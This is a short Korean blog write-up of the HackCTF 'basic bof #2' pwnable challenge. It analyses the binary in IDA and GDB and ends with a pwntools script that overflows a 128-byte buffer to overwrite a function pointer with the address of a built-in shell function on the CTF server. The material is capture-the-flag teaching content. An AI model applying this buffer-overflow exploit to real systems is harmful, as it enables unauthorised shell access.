---
layout: post
title: "hackctf basic bof #2"
categories: [hackctf]
tags: [pwnable]
redirect_from:
 - /2019/08/05/
---
먼저 파일을 IDA로 분석하자.
![캡처](https://user-images.githubusercontent.com/51374792/62466597-a3278b80-b7cc-11e9-98ea-f68350b5c6eb.PNG)
최대 133만큼 입력받는다.

리눅스로 옮겨 GDB를 보자.
![캡처](https://user-images.githubusercontent.com/51374792/62467284-5775e180-b7ce-11e9-818e-842eb5c556ab.PNG)

main+48에서 입력받는다.

또한 main+20에서 함수를 호출하기 위해 0x80484b4를 참조하는 것을 알 수 있다.

A를 120개 넣고 레지스터가 어떻게 되는지 확인해봤다.

![캡처](https://user-images.githubusercontent.com/51374792/62604611-6629d900-b933-11e9-806d-80739c8238bb.PNG)

이곳에 0x80484b4가 있는 것이 보인다.

입력값 129개부터에서 보이는 것을 보니, 129개의 값과 쉘 코드를 실행시키는 주소를 넣어주면 되겠다.

![캡처2](https://user-images.githubusercontent.com/51374792/62604662-8063b700-b933-11e9-8a18-5aae6856ff48.PNG)

IDA에서 사용하는 함수를 보니, shell이라는 것이 있다.

이것을 RET주소로 넣어주자.

```python
#!/usr/bin/python
from pwn import *

p=remote("ctf.j0n9hyun.xyz",3001)
code="A"*128+"\x9b\x84\x04\x08"
p.sendline(code)

p.interactive()
p.close()
```
